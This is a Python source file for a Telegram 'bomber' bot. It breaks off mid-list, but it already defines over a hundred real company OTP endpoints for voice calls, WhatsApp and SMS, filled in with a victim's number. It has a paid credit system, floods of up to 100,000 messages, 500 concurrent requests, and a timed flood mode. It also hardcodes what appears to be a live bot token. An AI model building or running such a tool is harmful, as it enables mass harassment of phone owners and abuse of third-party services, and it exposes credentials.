# bomber_bot.py
# ─────────────────────────────────────────────────────────────
# Unified Telegram Bomber Bot — FULL POWER BUILD
# Every endpoint from bomb.py / new_bomb.py / main.py / SMS BOOM.py /
# bot.py / final list, merged. Dedup by URL. Categorized.
#
# Requirements:  pip install aiogram aiohttp aiosmtplib
# Admin contact: @sanjipro5
# ─────────────────────────────────────────────────────────────

import asyncio
import aiohttp
import aiohttp.web
import aiosmtplib
import base64
import sqlite3
import secrets
import string
import time
import logging
import os
import csv
import io
import json
import re
import sys
from email.mime.text import MIMEText
from email.utils import formataddr, formatdate, make_msgid

from aiogram import Bot, Dispatcher, F, types, BaseMiddleware
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    BufferedInputFile,
)

# ─────────────────────────────────────────────────────────────
# CONFIG
# ─────────────────────────────────────────────────────────────
BOT_TOKEN = "8301089530:AAFNYRfY3vbB7IgPybATo14rsUD4Th-ZONI"
DB_PATH   = os.getenv("DB_PATH", "bomber_bot.db")
LOG_PATH  = os.getenv("LOG_PATH", "bomber_bot.log")
ADMIN_IDS_ENV = {5851573541, 45767764855}
PORT      = int(os.getenv("PORT", "10000"))
ADMIN_CONTACT = "@sanjipro5"

DEFAULT_BOMB_COST    = 1
DEFAULT_MAX_COUNT    = 100000
DEFAULT_COOLDOWN     = 5
DEFAULT_CONCURRENCY  = 500          # in-flight requests cap
DEFAULT_DAILY_BONUS  = 5
REFERRAL_BONUS       = 3
API_FAIL_THRESHOLD   = 8
LOG_RETENTION_DAYS   = 30
FLOOD_MAX_MINUTES    = 1440
FLOOD_COST_PER_MIN   = 1
START_TIME           = int(time.time())

TW_SID   = os.getenv("TW_SID",   "")
TW_TOKEN = os.getenv("TW_TOKEN", "")
TW_FROM  = os.getenv("TW_FROM",  "")
TW_CONTENT_SID = os.getenv("TW_CONTENT_SID", "")
TW_EMAIL_FROM  = f"{TW_SID}@twilio.email" if TW_SID else ""

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler(LOG_PATH, encoding="utf-8"),
    ],
)
log = logging.getLogger("bomber")

# ─────────────────────────────────────────────────────────────
# DATABASE
# ─────────────────────────────────────────────────────────────
_conn = sqlite3.connect(DB_PATH, check_same_thread=False, timeout=30)
_conn.row_factory = sqlite3.Row
for pragma in ("journal_mode=WAL", "synchronous=NORMAL", "busy_timeout=30000"):
    try:
        _conn.execute(f"PRAGMA {pragma}")
    except Exception:
        pass


def _exec(sql, params=(), fetch=None):
    with _conn:
        cur = _conn.execute(sql, params)
        if fetch == "one":
            return cur.fetchone()
        if fetch == "all":
            return cur.fetchall()
        return cur.lastrowid


def _col_exists(table, col):
    cur = _conn.execute(f"PRAGMA table_info({table})")
    return any(row["name"] == col for row in cur.fetchall())


# ─────────────────────────────────────────────────────────────
# MASTER ENDPOINT LIST
# Format: (name, category, method, url, headers_dict, body_template)
# body_template: str, dict, or None. Placeholders: {target}  {msg}
# category: sms | whatsapp | call | email | legacy
# ─────────────────────────────────────────────────────────────
MASTER_ENDPOINTS = [

    # ═════════════════════════════════════════════════════════
    # VOICE CALL TIER
    # ═════════════════════════════════════════════════════════
    ("call:TataCapitalVoice", "call", "POST",
     "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "isOtpViaCallAtLogin": "true"}),

    ("call:SwiggyCall", "call", "POST",
     "https://profile.swiggy.com/api/v3/app/request_call_verification",
     {"Content-Type": "application/json; charset=utf-8"},
     {"mobile": "{target}"}),

    ("call:MMTVoice", "call", "POST",
     "https://www.makemytrip.com/api/4/voice-otp/generate",
     {"Content-Type": "application/json"},
     {"phone": "{target}"}),

    ("call:GoibiboVoice", "call", "POST",
     "https://www.goibibo.com/user/voice-otp/generate/",
     {"Content-Type": "application/json"},
     {"phone": "{target}"}),

    ("call:MyntraVoice", "call", "POST",
     "https://www.myntra.com/gw/mobile-auth/voice-otp",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),

    ("call:FlipkartVoice", "call", "POST",
     "https://www.flipkart.com/api/6/user/voice-otp/generate",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),

    ("call:AmazonVoice", "call", "POST",
     "https://www.amazon.in/ap/signin",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "action": "voice-otp"}),

    ("call:PaytmVoice", "call", "POST",
     "https://accounts.paytm.com/signin/voice-otp",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),

    ("call:ZomatoVoice", "call", "POST",
     "https://www.zomato.com/php/o2_api_handler.php",
     {"Content-Type": "application/x-www-form-urlencoded"},
     "_raw=phone={target}&type=voice"),

    ("call:OlaVoice", "call", "POST",
     "https://api.olacabs.com/v1/voice-otp",
     {"Content-Type": "application/json"},
     {"phone": "{target}"}),

    ("call:UberVoice", "call", "POST",
     "https://auth.uber.com/v2/voice-otp",
     {"Content-Type": "application/json"},
     {"phone": "{target}"}),

    ("call:ApolloCall", "call", "POST",
     "https://apigateway.apollo247.in/auth-service/getOTPOnCall",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),

    ("call:1MGVoice", "call", "POST",
     "https://www.1mg.com/auth_api/v6/create_token",
     {"Content-Type": "application/json; charset=utf-8"},
     {"number": "{target}", "otp_on_call": True}),

    ("call:DoubtnutCall", "call", "POST",
     "https://micro.doubtnut.com/otp/send-call",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),

    ("call:SnitchVoice", "call", "POST",
     "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/resend/voice",
     {"Content-Type": "application/json"},
     {"mobile_number": "+91{target}"}),

    # ═════════════════════════════════════════════════════════
    # WHATSAPP TIER
    # ═════════════════════════════════════════════════════════
    ("wa:KPNWhatsApp", "whatsapp", "POST",
     "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
     {"Content-Type": "application/json; charset=UTF-8",
      "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f"},
     {"notification_channel": "WHATSAPP",
      "phone_number": {"country_code": "+91", "number": "{target}"}}),

    ("wa:JockeyWhatsApp", "whatsapp", "GET",
     "https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{target}?whatsapp=true",
     {}, None),

    ("wa:FoxyWhatsApp", "whatsapp", "POST",
     "https://www.foxy.in/api/v2/users/send_otp",
     {"Content-Type": "application/json"},
     {"user": {"phone_number": "+91{target}"}, "via": "whatsapp"}),

    ("wa:StratzyWhatsApp", "whatsapp", "POST",
     "https://stratzy.in/api/web/whatsapp/sendOTP",
     {"Content-Type": "application/json"},
     {"phoneNo": "{target}"}),

    ("wa:RappiWhatsApp", "whatsapp", "POST",
     "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
     {"Content-Type": "application/json; charset=utf-8"},
     {"country_code": "+91", "phone": "{target}"}),

    ("wa:EkaCareWhatsApp", "whatsapp", "POST",
     "https://auth.eka.care/auth/init",
     {"Content-Type": "application/json"},
     {"phone": "+91{target}", "channel": "whatsapp"}),

    # ═════════════════════════════════════════════════════════
    # SMS TIER
    # ═════════════════════════════════════════════════════════
    ("sms:LenskartSMS", "sms", "POST",
     "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
     {"Content-Type": "application/json"},
     {"phoneCode": "+91", "telephone": "{target}"}),

    ("sms:NoBrokerSMS", "sms", "POST",
     "https://www.nobroker.in/api/v3/account/otp/send",
     {"Content-Type": "application/x-www-form-urlencoded"},
     "_raw=phone={target}&countryCode=IN"),

    ("sms:PharmEasySMS", "sms", "POST",
     "https://pharmeasy.in/api/v2/auth/send-otp",
     {"Content-Type": "application/json"},
     {"phone": "{target}"}),

    ("sms:WakefitSMS", "sms", "POST",
     "https://api.wakefit.co/api/consumer-sms-otp/",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),

    ("sms:ByjusSMS", "sms", "POST",
     "https://api.byjus.com/v2/otp/send",
     {"Content-Type": "application/json"},
     {"phone": "{target}"}),

    ("sms:HungamaOTP", "sms", "POST",
     "https://communication.api.hungama.com/v1/communication/otp",
     {"Content-Type": "application/json"},
     {"mobileNo": "{target}", "countryCode": "+91", "appCode": "un",
      "messageId": "1", "device": "web"}),

    ("sms:ServeTel", "sms", "POST",
     "https://api.servetel.in/v1/auth/otp",
     {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8"},
     "_raw=mobile_number={target}"),

    # ═════════════════════════════════════════════════════════
    # LEGACY TIER — big batch
    # ═════════════════════════════════════════════════════════

    # ── FreeFire bomber endpoint ──
    ("legacy:FreeFireBomber", "legacy", "GET",
     "https://freefire-api.ct.ws/bomber4.php?phone={target}&duration=10",
     {}, None),

    # ── Hotstar / streaming ──
    ("legacy:Hotstar", "legacy", "PUT",
     "https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp",
     {"Content-Type": "application/json",
      "x-hs-platform": "PCTV",
      "x-country-code": "IN",
      "origin": "https://www.hotstar.com"},
     {"phone_number": "{target}", "country_prefix": "91"}),

    ("legacy:AltBalaji", "legacy", "POST",
     "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN",
     {"Content-Type": "application/json",
      "origin": "https://www.altbalaji.com"},
     {"phone_number": "{target}", "country_code": "91", "platform": "web"}),

    ("legacy:Voot", "legacy", "POST",
     "https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser",
     {"Content-Type": "application/json;charset=UTF-8",
      "origin": "https://www.voot.com"},
     {"type": "mobile", "mobile": "{target}", "countryCode": "+91"}),

    ("legacy:SonyLIV", "legacy", "POST",
     "https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP",
     {"Content-Type": "application/json",
      "app_version": "3.1.42.3",
      "origin": "https://www.sonyliv.com"},
     {"mobileNumber": "{target}", "channelPartnerID": "MSMIND", "country": "IN"}),

    ("legacy:Ullu", "legacy", "POST",
     "https://ullu.app/ulluCore/api/v1/otp/sendRegisterOTP?mobileNumber={target}",
     {"origin": "https://ullu.app"}, None),

    ("legacy:Zee5", "legacy", "GET",
     "https://b2bapi.zee5.com/device/sendotp_v1.php?phoneno={target}",
     {"origin": "https://www.zee5.com"}, None),

    # ── E-commerce ──
    ("legacy:Snapdeal", "legacy", "POST",
     "https://m.snapdeal.com/signupCompleteAjax",
     {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
     "_raw=j_password=null&j_mobilenumber={target}&agree=true&j_confpassword=null"
     "&journey=mobile&numberEdit=false&swp=true&j_fullname=uyuhyntuhy"),

    ("legacy:SnapdealSendOTP", "legacy", "POST",
     "https://m.snapdeal.com/sendOTP",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),

    ("legacy:FlipkartSMS", "legacy", "POST",
     "https://1.rome.api.flipkart.com/1/action/view",
     {"Content-Type": "application/json",
      "origin": "https://www.flipkart.com",
      "x-user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36"},
     {"actionRequestContext": {"type": "LOGIN_IDENTITY_VERIFY",
                               "loginIdPrefix": "+91",
                               "loginId": "{target}",
                               "loginType": "MOBILE",
                               "verificationType": "OTP",
                               "screenName": "LOGIN_V4_MOBILE",
                               "sourceContext": "DEFAULT"}}),

    ("legacy:FlipkartImage", "legacy", "GET",
     "https://img1a.flixcart.com/batman-returns/batman-returns/p/images/logo_lite-cbb357.png",
     {"referer": "https://www.flipkart.com/login/verify?loginIdentifier={target}"},
     None),

    ("legacy:Shopsy", "legacy", "POST",
     "https://www.shopsy.in/api/1/action/view",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),

    ("legacy:Samsung", "legacy", "POST",
     "https://www.samsung.com/in/api/v1/sso/otp/init",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),

    ("legacy:AjioSendOTP", "legacy", "POST",
     "https://login.web.ajio.com/api/auth/signupSendOTP",
     {"Content-Type": "application/json"},
     {"firstName": "Test User", "login": "test@example.com",
      "password": "TestPass123", "genderType": "",
      "mobileNumber": "{target}", "requestType": "SENDOTP"}),

    ("legacy:AjioAccountCheck", "legacy", "POST",
     "https://login.web.ajio.com/api/auth/accountCheck",
     {"Content-Type": "application/json",
      "origin": "https://www.ajio.com"},
     {"emailId": "test@example.com"}),

    ("legacy:MyntraLogin", "legacy", "POST",
     "https://www.myntra.com/gateway/v2/user/otp/generate",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),

    ("legacy:BigBasket", "legacy", "POST",
     "https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/",
     {"Content-Type": "application/json",
      "x-channel": "BB-PWA",
      "origin": "https://www.bigbasket.com"},
     {"identifier": "{target}"}),

    ("legacy:Cilory", "legacy", "POST",
     "https://www.cilory.com/app/w/auth/soft",
     {"Content-Type": "application/json;charset=UTF-8"},
     {"mobile": "{target}"}),

    ("legacy:Limeroad", "legacy", "POST",
     "https://www.limeroad.com/auth/get_uuid_v2?ajax=true&mobileOnly=false",
     {"Content-Type": "application/x-www-form-urlencoded"},
     "_raw=utf8=%E2%9C%93&authenticity_token=6686Dtpby7plpvjXr5%2Fe8oyPdiQ3Weta9Y9ydzSRP64%3D"
     "&user_id={target}"),

    ("legacy:LimeroadResend", "legacy", "POST",
     "https://www.limeroad.com/auth/resend_otp",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),

    ("legacy:MyImagineStore", "legacy", "POST",
     "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
     {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
     "_raw=mobile={target}"),

    ("legacy:Cossouq", "legacy", "POST",
     "https://www.cossouq.com/mobilelogin/otp/send",
     {"Content-Type": "application/x-www-form-urlencoded"},
     "_raw=mobilenumber={target}&otptype=register"),

    ("legacy:Shemaroome", "legacy", "POST",
     "https://www.shemaroome.com/users/resend_otp",
     {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
     "_raw=mobile_no=%2B91{target}"),

    ("legacy:Banggood", "legacy", "POST",
     "https://m.banggood.in/index.php?com=login&t=sendMtSms&c=api",
     {"Content-Type": "application/x-www-form-urlencoded",
      "origin": "https://m.banggood.in"},
     "_raw=mobilePhone={target}&countryPhoneCode=91&type=1&verifyCode=KmUu"),

    ("legacy:FBBOnline", "legacy", "POST",
     "https://www.fbbonline.in/customer/account/GenerateOtp",
     {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
     "_raw=YII_CSRF_TOKEN=6ea54179a7dc67c7ed0d6847f76d6204320976eb"
     "&RegistrationForm%5Bsignup_page%5D=1"
     "&RegistrationForm%5Bcontact_number%5D={target}"
     "&RegistrationForm%5Bvalid_mobile%5D=1"
     "&RegistrationForm%5Bemail%5D=test%40example.com"
     "&RegistrationForm%5Bvalid_email%5D=1"
     "&RegistrationForm%5Bfirst_name%5D=Test"
     "&RegistrationForm%5Blast_name%5D=User"
     "&RegistrationForm%5Bpassword%5D=TestPass123"
     "&RegistrationForm%5Btc_opt_in%5D=on&validate_otp="),

    ("legacy:Grofers", "legacy", "POST",
     "https://grofers.com/v2/accounts/",
     {"Content-Type": "application/x-www-form-urlencoded",
      "origin": "https://grofers.com",
      "app_client": "consumer_web"},
     "_raw=user_phone={target}"),

    ("legacy:Snapmint", "legacy", "POST",
     "https://api.snapmint.com/v1/public/sign_up",
     {"Content-Type": "application/json"},
     {"phone": "{target}"}),

    ("legacy:DealShare", "legacy", "POST",
     "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code",
     {"Content-Type": "application/json"},
     {"mobile": "{target}", "hashCode": "k387IsBaTmn",
      "resendOtp": True, "app": "dealshare",
      "loginType": "8a18d60e0029e806"}),

    ("legacy:RentoMojo", "legacy", "POST",
     "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
     {"Content-Type": "application/json"},
     {"phone": "{target}"}),

    ("legacy:NoBroker", "legacy", "POST",
     "https://www.nobroker.in/api/v3/account/otp/send",
     {"Content-Type": "application/x-www-form-urlencoded"},
     "_raw=phone={target}&countryCode=IN"),

    ("legacy:Housing", "legacy", "POST",
     "https://login.housing.com/api/v2/send-otp",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "country_url_name": "in"}),

    ("legacy:HousingGQL", "legacy", "POST",
     "https://mightyzeus.housing.com/api/gql",
     {"Content-Type": "application/json"},
     {"query": "mutation {sendOtp(phone: \"{target}\") {success}}"}),

    ("legacy:Swipe", "legacy", "POST",
     "https://app.getswipe.in/api/user/mobile_login",
     {"Content-Type": "application/json"},
     {"mobile": "{target}", "resend": True}),

    ("legacy:Moglix", "legacy", "POST",
     "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
     {"Content-Type": "application/json"},
     {"mobile": "{target}", "buildVersion": "24.0", "p": "android"}),

    ("legacy:CountryDelight", "legacy", "POST",
     "https://api.countrydelight.in/api/v1/customer/requestOtp",
     {"Content-Type": "application/json"},
     {"mobile": "{target}", "platform": "Android", "mode": "new_user"}),

    ("legacy:WellnessForever", "legacy", "POST",
     "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer",
     {"Content-Type": "application/x-www-form-urlencoded"},
     "_raw=method=firstRegisterApi&data="
     "%7B%22customerMobile%22%3A%22{target}%22%2C%22generateOtp%22%3A%22true%22%7D"),

    ("legacy:LifestyleStores", "legacy", "POST",
     "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP",
     {"Content-Type": "application/json"},
     {"signInMobile": "{target}", "channel": "sms"}),

    ("legacy:Smytten", "legacy", "POST",
     "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "email": "test@example.com"}),

    ("legacy:CaratLane", "legacy", "POST",
     "https://www.caratlane.com/cg/dhevudu",
     {"Content-Type": "application/json"},
     {"query": "mutation {SendOtp(input: {mobile: \"{target}\","
               "isdCode: \"91\",otpType: \"registerOtp\"}) "
               "{status {message code}}}"}),

    ("legacy:Spencer", "legacy", "POST",
     "https://jiffy.spencers.in/user/auth/otp/send",
     {"Content-Type": "application/json", "User-Agent": "okhttp/4.12.0"},
     {"phone": "{target}"}),

    ("legacy:ShoppersStop", "legacy", "POST",
     "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "loginType": "SIGNIN_WITH_MOBILE"}),

    ("legacy:Brevistay", "legacy", "POST",
     "https://www.brevistay.com/cst/app-api/login",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),

    ("legacy:Flomattress", "legacy", "POST",
     "https://cod.flomattress.com/api/otp",
     {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
      "origin": "https://www.flomattress.com"},
     "_raw=number={target}&store=hushbedding.myshopify.com"),

    ("legacy:Coolwinks", "legacy", "GET",
     "https://api.coolwinks.com/api/accounts/is_already_registered/?username={target}",
     {"origin": "https://www.coolwinks.com"}, None),

    ("legacy:Cansell", "legacy", "POST",
     "https://webapi.cansell.in/api/User/SignUp",
     {"Content-Type": "application/json;charset=UTF-8",
      "origin": "https://m.cansell.in"},
     {"name": "Test", "surname": "User", "email": "test@example.com",
      "phone": "{target}", "password": "test1234"}),

    ("legacy:MoreRetail", "legacy", "POST",
     "https://omni-api.moreretail.in/api/v1/login/",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),

    ("legacy:UrbanClap", "legacy", "POST",
     "https://www.urbanclap.com/api/v2/growth/profile/generateOTP",
     {"Content-Type": "application/json;charset=UTF-8",
      "origin": "https://www.urbancompany.com"},
     {"country_id": "IND",
      "phone": {"isd_code": "+91", "phone_wo_isd": "{target}"},
      "device_type": "customer"}),

    # ── Payments / Fintech ──
    ("legacy:Paytm", "legacy", "POST",
     "https://accounts.paytm.com/v2/api/register",
     {"Content-Type": "application/json",
      "origin": "https://accounts.paytm.com"},
     {"email": "", "mobile": "{target}", "loginPassword": "Pura@1090",
      "csrfToken": "f7ea628c-91a2-5f14-82ca-6f7eee295b1d",
      "redirectUri": "https://paytm.com/v1/api/authresponse",
      "clientId": "paytm-web-secure", "scope": "paytm", "state": "",
      "responseType": "code", "theme": "mp-html5", "dob_agreement": True}),

    ("legacy:LendingPlate", "legacy", "POST",
     "https://lendingplate.com/api.php",
     {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
     "_raw=mobiles={target}&resend=Resend"),

    ("legacy:MPokket", "legacy", "POST",
     "https://web-api.mpokket.in/registration/sendOtp",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),

    ("legacy:NuvamaWealth", "legacy", "POST",
     "https://nma.nuvamawealth.com/edelmw-content/content/otp/register",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),

    ("legacy:MyHubble", "legacy", "POST",
     "https://api.myhubble.money/v1/auth/otp/generate",
     {"Content-Type": "application/json"},
     {"phoneNumber": "{target}", "channel": "SMS"}),

    ("legacy:TataCapitalBiz", "legacy", "POST",
     "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp",
     {"Content-Type": "application/json"},
     {"mobileNumber": "{target}", "deviceOs": "Android",
      "sourceName": "MitayeFaasleWebsite", "isOdFlow": "no",
      "deviceInfo": "Windows Web Browser"}),

    ("legacy:TataMotors", "legacy", "POST",
     "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "locationUrl": "https://cars.tatamotors.com",
      "reqBody": "sendOtp"}),

    ("legacy:GoKwik", "legacy", "POST",
     "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "country": "in"}),

    ("legacy:PayMeIndia", "legacy", "POST",
     "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "uniqueReferCode": "S10ePIIrbH3"}),

    ("legacy:Univest", "legacy", "GET",
     "https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={target}",
     {}, None),

    ("legacy:Revv", "legacy", "POST",
     "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "deviceType": "website", "appVersion": "1.0"}),

    ("legacy:GetInstaCash", "legacy", "POST",
     "https://getinstacash.in/sell/getData.php",
     {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
      "X-Requested-With": "XMLHttpRequest"},
     "_raw=type=sendOTP&mobile={target}"),

    ("legacy:Ogonn", "legacy", "POST",
     "https://ogonn.in/otp",
     {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
     "_raw=_token=I10LMVWBAN1c30T8SbgVHHvlKFTgTU1iFTm7hlfl&mobile={target}"),

    ("legacy:Kotak1", "legacy", "POST",
     "https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/save-home-mobile.action?source=VKYCIL&banner=ILVKYClaunch&pubild=VKYClaunchmailer_1696_&SWNToken=1603857481489&flw=vkyc",
     {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
      "X-Requested-With": "XMLHttpRequest"},
     "_raw=cust_full_name=Test+User&cust_email=test%40example.com"
     "&cust_mobile={target}&cust_political_disclaimer=Yes"
     "&cust_fatca_disclaimer=Yes"),

    ("legacy:Kotak2", "legacy", "POST",
     "https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/resend-otp0on-call.action?SWNToken=1603857646468&flw=vkyc",
     {"X-Requested-With": "XMLHttpRequest"}, None),

    ("legacy:AngelBroking", "legacy", "POST",
     "https://www.angelbroking.com/form-gateways/oda-form.php",
     {"Content-Type": "application/x-www-form-urlencoded"},
     "_raw=name=Test+User&mobile={target}&city=pune&web_placement_id=21"
     "&ref_url=-&page_url=%2Fopen-demat-account%2F&post-id=2752"),

    # ── Education ──
    ("legacy:Vedantu", "legacy", "POST",
     "https://user.vedantu.com/user/preLoginVerification",
     {"Content-Type": "application/json"},
     {"email": None, "phoneCode": "+91", "phoneNumber": "{target}", "ver": "11.345"}),

    ("legacy:Unacademy", "legacy", "POST",
     "https://unacademy.com/api/v3/user/user_check/",
     {"Content-Type": "application/json",
      "authorization": "Bearer undefined"},
     {"phone": "{target}", "country_code": "IN", "otp_type": 1,
      "email": "", "send_otp": True, "is_un_teach_user": False}),

    ("legacy:Byjus", "legacy", "POST",
     "https://bcas-prod.byjusweb.com/api/send-otp",
     {"Content-Type": "application/x-www-form-urlencoded",
      "origin": "https://byjus.com"},
     "_raw=phoneNumber={target}&page=free-trial-classes"),

    ("legacy:Cuemath", "legacy", "POST",
     "https://www.cuemath.com/api/v4/parents/",
     {"Content-Type": "application/json"},
     {"intl_mobile": {"phone": "{target}"},
      "notify": ["notify_on_whatsapp"], "phone": "{target}",
      "email": "test@example.com", "full_name": "Test User",
      "timezone": "Asia/Calcutta",
      "notify_through": "notify_on_whatsapp",
      "form_fields": "full_name,email,intl_mobile"}),

    ("legacy:DoubtnutV1", "legacy", "POST",
     "https://doubtnut.com/api/v1/user/login",
     {"Content-Type": "application/x-www-form-urlencoded",
      "origin": "https://doubtnut.com"},
     "_raw=phone={target}"),

    ("legacy:DoubtnutV4", "legacy", "POST",
     "https://api.doubtnut.com/v4/student/login",
     {"Content-Type": "application/json; charset=utf-8"},
     {"phone_number": "{target}", "language": "en"}),

    ("legacy:PenPencil", "legacy", "POST",
     "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "firstName": "test", "lastName": "user"}),

    ("legacy:PenPencilResend", "legacy", "POST",
     "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
     {"Content-Type": "application/json; charset=utf-8"},
     {"organizationId": "5eb393ee95fab7468a79d189", "mobile": "{target}"}),

    ("legacy:Entri", "legacy", "POST",
     "https://entri.app/api/v3/users/check-phone/",
     {"Content-Type": "application/json"},
     {"phone": "{target}"}),

    ("legacy:Cosmofeed", "legacy", "POST",
     "https://prod.api.cosmofeed.com/api/user/authenticate",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "emailId": "test@example.com", "version": "1.4.28"}),

    ("legacy:AakashAnthe", "legacy", "POST",
     "https://antheapi.aakash.ac.in/api/generate-lead-otp",
     {"Content-Type": "application/json"},
     {"mobile_psid": "", "mobile_number": "{target}",
      "activity_type": "aakash-myadmission", "webengageData": "",
      "profile": "student", "whatsapp_opt_in": False}),

    ("legacy:AakashDigital1", "legacy", "POST",
     "https://digital.aakash.ac.in/mkt-signup-otp-verify",
     {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
     "_raw=&mobileval={target}&otp=6230"),

    ("legacy:AakashDigital2", "legacy", "POST",
     "https://digital.aakash.ac.in/signup-otp-verify",
     {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
     "_raw=&mobileval={target}"),

    ("legacy:WellAcademy", "legacy", "POST",
     "https://wellacademy.in/store/api/numberLoginV2",
     {"Content-Type": "application/json; charset=UTF-8"},
     {"contact_no": "{target}"}),

    ("legacy:Careers360", "legacy", "POST",
     "https://www.careers360.com/ajax/no-cache/user/otp-send",
     {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
      "X-Requested-With": "XMLHttpRequest",
      "origin": "https://www.careers360.com"},
     "_raw=mobile_number={target}&method=call&uid=12692588"),

    # ── Health ──
    ("legacy:HealthMug", "legacy", "POST",
     "https://api.healthmug.com/account/createotp",
     {"Content-Type": "application/json"},
     {"phone": "{target}"}),

    ("legacy:Apollo247", "legacy", "POST",
     "https://www.apollo247.com",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),

    ("legacy:Netmeds1", "legacy", "GET",
     "https://apiv2.netmeds.com/mst/rest/v1/id/details/?mobile={target}",
     {}, None),

    ("legacy:Netmeds2", "legacy", "GET",
     "https://m.netmeds.com/mst/rest/v1/id/details/{target}",
     {}, None),

    ("legacy:MedPlus", "legacy", "POST",
     "https://mobile.medplusindia.com/mobilemvc/profile/register.mbl",
     {"Content-Type": "application/x-www-form-urlencoded",
      "origin": "https://www.medplusmart.com"},
     "_raw=recieveUpdates=1&firstName=Test&lastName=User"
     "&emailId=test%40example.com&password=TestPass%24123"
     "&confirmpwd=TestPass%24123&mobileNumber={target}"
     "&SESSIONID=17C83B4A90182E8DA6F4F15755A43027"
     "&isCordova=false&isPhonepeSwitch=false"),

    ("legacy:Purplle", "legacy", "GET",
     "https://www.purplle.com/api/account/authorization/send_otp?phone={target}&action=register",
     {"origin": "https://www.purplle.com"}, None),

    # ── Social / Dating ──
    ("legacy:TrulyMadly", "legacy", "POST",
     "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),

    ("legacy:BetterHalf", "legacy", "POST",
     "https://api.betterhalf.ai/v2/auth/otp/send/",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),

    ("legacy:Charzer", "legacy", "POST",
     "https://api.charzer.com/auth-service/send-otp",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),

    # ── Travel ──
    ("legacy:Redbus", "legacy", "GET",
     "https://m.redbus.in/api/getOtp?number={target}&cc=91&whatsAppOpted=undefined",
     {"origin": "https://m.redbus.in"}, None),

    ("legacy:Makemytrip", "legacy", "POST",
